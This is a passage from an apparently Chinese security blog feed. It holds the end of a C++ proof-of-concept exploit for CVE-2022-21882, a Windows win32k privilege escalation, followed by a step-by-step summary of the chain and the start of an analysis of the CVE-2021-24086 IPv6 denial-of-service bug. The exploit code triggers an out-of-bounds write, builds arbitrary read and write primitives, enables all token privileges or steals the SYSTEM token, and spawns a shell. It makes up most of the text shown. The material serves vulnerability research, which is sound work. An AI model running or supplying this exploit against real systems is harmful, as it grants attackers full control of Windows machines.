operator">&lt;</span> <span class="token number">0x100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            PUCHAR tr <span class="token operator">=</span> <span class="token punctuation">(</span>PUCHAR<span class="token punctuation">)</span>gb<span class="token operator">::</span>u32_IsMenu <span class="token operator">+</span> i<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>tr <span class="token operator">==</span> <span class="token number">0xE8</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span><span class="token comment">//找到调用HMValidateHandle的指令位置</span>                offset <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>gb<span class="token operator">::</span>u32_IsMenu <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                next_code <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>gb<span class="token operator">::</span>u32_IsMenu <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>                gb<span class="token operator">::</span>HMValidateHandle <span class="token operator">=</span> <span class="token punctuation">(</span>HMValidateHandle_t<span class="token punctuation">)</span><span class="token punctuation">(</span>next_code <span class="token operator">+</span> offset<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>gb<span class="token operator">::</span>HMValidateHandle<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Can not find HMValidateHandle!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>            __leave<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Found HMValidateHandle = 0x%p\n"</span><span class="token punctuation">,</span> gb<span class="token operator">::</span>HMValidateHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>        gb<span class="token operator">::</span>g_hNtdll <span class="token operator">=</span> <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>gb<span class="token operator">::</span>g_hNtdll<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: %d, Code = 0x%p"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>            __leave<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        gb<span class="token operator">::</span>g_hWin32u <span class="token operator">=</span> <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"win32u.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>gb<span class="token operator">::</span>g_hWin32u<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: %d, Code = 0x%p"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>            __leave<span class="token punctuation">;</span>        <span class="token punctuation">}</span>                gb<span class="token operator">::</span>NtCallbackReturn <span class="token operator">=</span> <span class="token punctuation">(</span>NtCallbackReturn_t<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hNtdll<span class="token punctuation">,</span> <span class="token string">"NtCallbackReturn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gb<span class="token operator">::</span>NtUserMessageCall <span class="token operator">=</span> <span class="token punctuation">(</span>NtUserMessageCall_t<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hWin32u<span class="token punctuation">,</span> <span class="token string">"NtUserMessageCall"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gb<span class="token operator">::</span>NtUserConsoleControl <span class="token operator">=</span> <span class="token punctuation">(</span>NtUserConsoleControl_t<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hWin32u<span class="token punctuation">,</span> <span class="token string">"NtUserConsoleControl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gb<span class="token operator">::</span>ZwQuerySystemInformation <span class="token operator">=</span> <span class="token punctuation">(</span>ZwQuerySystemInformation_t<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hNtdll<span class="token punctuation">,</span> <span class="token string">"NtQuerySystemInformation"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gb<span class="token operator">::</span>RtlAllocateHeap <span class="token operator">=</span> <span class="token punctuation">(</span>RtlAllocateHeap_t<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hNtdll<span class="token punctuation">,</span> <span class="token string">"RtlAllocateHeap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>gb<span class="token operator">::</span>NtCallbackReturn<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> gb<span class="token operator">::</span>NtUserMessageCall<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span>             gb<span class="token operator">::</span>NtUserConsoleControl<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> gb<span class="token operator">::</span>ZwQuerySystemInformation<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span>            gb<span class="token operator">::</span>RtlAllocateHeap<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: %d, Code = 0x%p"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>            __leave<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    __finally <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> bRet<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span>        <span class="token string">"Usage:\n"</span>        <span class="token string">"         Example: CVE-2022-21882.exe whoami\n"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    WNDCLASSEXW WndClassExW <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    ULONG64 TokenAddr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        TokenAddr <span class="token operator">=</span> <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>TokenAddr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] Error(%u): GetToken failed.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        WndClassExW<span class="token punctuation">.</span>hIcon <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        WndClassExW<span class="token punctuation">.</span>hbrBackground <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        WndClassExW<span class="token punctuation">.</span>lpszClassName <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        WndClassExW<span class="token punctuation">.</span>lpfnWndProc <span class="token operator">=</span> <span class="token punctuation">(</span>WNDPROC<span class="token punctuation">)</span>WindowProc<span class="token punctuation">;</span>        WndClassExW<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WNDCLASSEXW<span class="token punctuation">)</span><span class="token punctuation">;</span>        WndClassExW<span class="token punctuation">.</span>style <span class="token operator">=</span> CS_VREDRAW <span class="token operator">|</span> CS_HREDRAW<span class="token punctuation">;</span><span class="token punctuation">;</span>        WndClassExW<span class="token punctuation">.</span>cbClsExtra <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        WndClassExW<span class="token punctuation">.</span>cbWndExtra <span class="token operator">=</span> <span class="token number">0x60</span><span class="token punctuation">;</span>        WndClassExW<span class="token punctuation">.</span>hInstance <span class="token operator">=</span> <span class="token function">GetModuleHandleW</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        WndClassExW<span class="token punctuation">.</span>lpszClassName <span class="token operator">=</span> L<span class="token string">"VictimClass"</span><span class="token punctuation">;</span>        <span class="token comment">//被覆盖写</span>        ATOM atom_vic <span class="token operator">=</span> <span class="token function">RegisterClassExW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>WndClassExW<span class="token punctuation">)</span><span class="token punctuation">;</span>        WndClassExW<span class="token punctuation">.</span>cbWndExtra <span class="token operator">=</span> TRIGGERWND_EXTRASIZE<span class="token punctuation">;</span>        WndClassExW<span class="token punctuation">.</span>lpszClassName <span class="token operator">=</span> L<span class="token string">"TriggerClass"</span><span class="token punctuation">;</span>        <span class="token comment">//触发漏洞</span>        ATOM atom_trig <span class="token operator">=</span> <span class="token function">RegisterClassExW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>WndClassExW<span class="token punctuation">)</span><span class="token punctuation">;</span>        gb<span class="token operator">::</span>g_hVictimWnd <span class="token operator">=</span> <span class="token function">CreateWindowExW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span>            <span class="token punctuation">(</span>LPCWSTR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>atom_vic<span class="token punctuation">,</span>            L<span class="token string">"VictimWnd"</span><span class="token punctuation">,</span>            <span class="token constant">NULL</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>             <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token function">GetModuleHandleW</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Created victim windows = 0x%p\n"</span><span class="token punctuation">,</span> gb<span class="token operator">::</span>g_hVictimWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>        gb<span class="token operator">::</span>g_hTriggerWnd <span class="token operator">=</span> <span class="token function">CreateWindowExW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span>            <span class="token punctuation">(</span>LPCWSTR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>atom_trig<span class="token punctuation">,</span>            L<span class="token string">"TriggerBug"</span><span class="token punctuation">,</span>            <span class="token constant">NULL</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token function">GetModuleHandleW</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Created trigger windows = 0x%p\n"</span><span class="token punctuation">,</span> gb<span class="token operator">::</span>g_hTriggerWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 触发漏洞</span>        <span class="token comment">// 获取刚创建的这两个窗口的桌面堆</span>        PWND Trigger<span class="token operator">=</span> gb<span class="token operator">::</span><span class="token function">HMValidateHandle</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hTriggerWnd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gb<span class="token operator">::</span>TriggerDeskHeap <span class="token operator">=</span> Trigger<span class="token operator">-&gt;</span>OffsetToDesktopHeap<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] TriggerDeskHeap's tagWND = 0x%p\n"</span><span class="token punctuation">,</span> Trigger<span class="token punctuation">)</span><span class="token punctuation">;</span>        PWND Victim <span class="token operator">=</span> gb<span class="token operator">::</span><span class="token function">HMValidateHandle</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hVictimWnd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gb<span class="token operator">::</span>VictimDeskHeap <span class="token operator">=</span> Victim<span class="token operator">-&gt;</span>OffsetToDesktopHeap<span class="token punctuation">;</span>        DWORD64 Distance <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>gb<span class="token operator">::</span>VictimDeskHeap<span class="token operator">&gt;</span> gb<span class="token operator">::</span>TriggerDeskHeap<span class="token punctuation">)</span> <span class="token punctuation">{</span>            Distance<span class="token operator">=</span>gb<span class="token operator">::</span>VictimDeskHeap <span class="token operator">-</span> gb<span class="token operator">::</span>TriggerDeskHeap<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            Distance <span class="token operator">=</span> gb<span class="token operator">::</span>TriggerDeskHeap <span class="token operator">-</span> gb<span class="token operator">::</span>VictimDeskHeap<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>Distance <span class="token operator">&gt;=</span> TRIGGERWND_EXTRASIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] Heap spray failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] VictimDeskHeap's tagWND = 0x%p\n"</span><span class="token punctuation">,</span> Victim<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] TriggerDeskHeap = %p\n"</span><span class="token punctuation">,</span> gb<span class="token operator">::</span>TriggerDeskHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] VictimDeskHeap = %p\n"</span><span class="token punctuation">,</span> gb<span class="token operator">::</span>VictimDeskHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 回调函数</span>        <span class="token function">SetFuncHook</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ClientAllocatWindowClassExtraBytesProxy<span class="token punctuation">,</span><span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ClientFreeWindowsClassExtraBytesProxy<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 触发漏洞</span>        gb<span class="token operator">::</span><span class="token function">NtUserMessageCall</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hTriggerWnd<span class="token punctuation">,</span> WM_CREATE<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 修改 tagWND_victim-&gt;ExtraBytes = TokenAddr</span>        ULONG_PTR Old <span class="token operator">=</span> <span class="token function">SetWindowLongPtrW</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hTriggerWnd<span class="token punctuation">,</span> <span class="token number">0x128</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span> TokenAddr<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 修改 Token-&gt;Privileges.Enabled = 0xFFFFFFFFFFFFFFFF</span>        <span class="token function">SetWindowLongPtrW</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hVictimWnd<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFFFFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 修改 Token-&gt;Privileges.Present = 0xFFFFFFFFFFFFFFFF</span>        <span class="token function">SetWindowLongPtrW</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hVictimWnd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFFFFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CheckPrivilege</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>hToken<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">SpawnShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] 提权失败！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>         <span class="token comment">// 恢复 tagWND_Victim-&gt;ExtraBytes = Old</span>        <span class="token function">SetWindowLongPtrW</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hTriggerWnd<span class="token punctuation">,</span> <span class="token number">0x128</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> Old<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 恢复 tagWND_Trigger-&gt;Styles &amp;= ~0x800</span>        <span class="token function">SetWindowLongPtrW</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hTriggerWnd<span class="token punctuation">,</span> Distance <span class="token operator">+</span> <span class="token number">0xE8</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> Trigger<span class="token operator">-&gt;</span>dwExStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1.触发越界写入漏洞，修改window对象的cbWndExtra为0xFFFEFFF，使用window对象WndExtra可以访问大内存。</p><p>2.修改另一个窗口的WS_CHILD标志，为另一个窗口设置一个专门构造的Menu(fake menu)</p><p>3.通过GetMenuBarInfo API和假菜单获取任意读取原语。</p><p>4.使用SetWindowLongPtrA API修改另一个窗口对象的ExtraBytes以获得任意写入原语。</p><p>5.通过EPROCESS ActiveProcessLinks找到PID为4的系统eprocess</p><p>6.读取系统token，替换当前进程token</p><p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173152485.png"></p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173215705.png" class=""><p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173238270.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-24086 TCPIP拒绝服务漏洞分析</title>
      <link href="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h2><p>Windows IPv6协议栈存在的一处拒绝服务漏洞，漏洞的根本原因是IPv6的嵌套分片机制中，当尝试递归重组嵌套的分片时会计算内部有效载荷中包含的所有扩展标头，当重组扩展头约为0xffff字节的数据包时，tcpip!IPv6ReassembleDatagram中发生的NULL指针解引用发生崩溃。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>漏洞是在tcpip!Ipv6pReassembleDatagram函数中，向rax中写入数据时导致崩溃。</p><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108162657004.png"></p><h3 id="tcpip-Ipv6pReassembleDatagram"><a href="#tcpip-Ipv6pReassembleDatagram" class="headerlink" title="tcpip!Ipv6pReassembleDatagram"></a>tcpip!Ipv6pReassembleDatagram</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108144319506.png"></p><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108150549114.png"></p><h3 id="NdisGetDataBuffer"><a href="#NdisGetDataBuffer" class="headerlink" title="NdisGetDataBuffer"></a>NdisGetDataBuffer</h3><pre class="line-numbers language-none"><code class="language-none">NDIS_EXPORTED_ROUTINE PVOID NdisGetDataBuffer(  [in]           NET_BUFFER *NetBuffer,    //指向NET_BUFFER的指针  [in]           ULONG      BytesNeeded,   //请求的数据的连续的字节数  [in, optional] PVOID      Storage,       //指向缓冲区的指针;如果调用方未提供任何缓冲区，则为 NULL 。 缓冲区的大小必须大于或等于 BytesNeeded 中指定的字节数。 如果此值不是 NULL，并且请求的数据不是连续的，则 NDIS 会将请求的数据复制到 存储 指示的区域。    [in]           ULONG      AlignMultiple, //幂对齐  [in]           ULONG      AlignOffset    //对齐倍数的偏移量);NdisGetDataBuffer 返回指向连续数据的开头的指针，或者返回 NULL。如果 NetBuffer 参数指向的 NET_BUFFER 结构中NET_BUFFER_DATA结构的 DataLength 成员小于 BytesNeeded 参数中的值，则返回值为 NULL。如果缓冲区中请求的数据是连续的，则返回值是指向 NDIS 提供的位置的指针。 如果数据不连续，NDIS 使用 存储 参数，如下所示：如果 Storage 参数为非 NULL，则 NDIS 会将数据复制到 存储中的缓冲区。 返回值是传递给 Storage 